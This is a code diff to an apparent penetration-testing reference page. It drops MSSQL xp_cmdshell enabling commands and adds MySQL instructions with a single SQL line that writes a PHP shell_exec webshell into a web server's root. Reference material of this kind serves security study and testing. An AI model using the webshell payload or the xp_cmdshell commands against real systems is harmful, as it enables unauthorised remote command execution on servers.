@@ -43,38 +43,16 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
 
 
               <Typography>
-              In Microsoft SQL Server, xp_cmdshell is a built-in extended stored procedure that allows executing operating system commands from within SQL Server. This feature is disabled by default, but we can try to enable it and execute commands.
+              In MySQL we are able to write a file to a location. We can achieve command execution if we are able to write a webshell to a location what we can access and execute commands. For example, suppose there is a website at `/var/www/html`. If we can write a webshell to `/var/www/html/shell.php` then we have command execution.
                </Typography>
-                <SyntaxHighlighter className="syntax" language="bash">
-              {"sp_configure 'show advanced options', 1"}
-            </SyntaxHighlighter>
-            <Box pt={2} />
-                <SyntaxHighlighter className="syntax" language="bash">
-              {"RECONFIGURE"}
-            </SyntaxHighlighter>
-            <Box pt={2} />
-                <SyntaxHighlighter className="syntax" language="bash">
-              {"sp_configure 'Ole Automation Procedures', 1"}
-            </SyntaxHighlighter>
-            <Box pt={2} />
-                <SyntaxHighlighter className="syntax" language="bash">
-              {"RECONFIGURE"}
-            </SyntaxHighlighter>
-            <Box pt={2}></Box>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {'xp_cmdshell "whoami"'}
-            </SyntaxHighlighter>
-               <Box pt={10} />
+               <Box pt={5} />
                <Typography>
-                    The same can also be done using mssqlclient.py
-                </Typography>
+              Write webshell to webroot
+               </Typography>
               <SyntaxHighlighter className="syntax" language="bash">
-              {"enable_xp_cmdshell"}
+              {"mysql> SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php';"}
             </SyntaxHighlighter>
-            <Box pt={2}></Box>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {'xp_cmdshell "whoami"'}
-            </SyntaxHighlighter>
+            <Box pt={5}></Box>
             </Typography>
           </AccordionDetails>
         </Accordion>
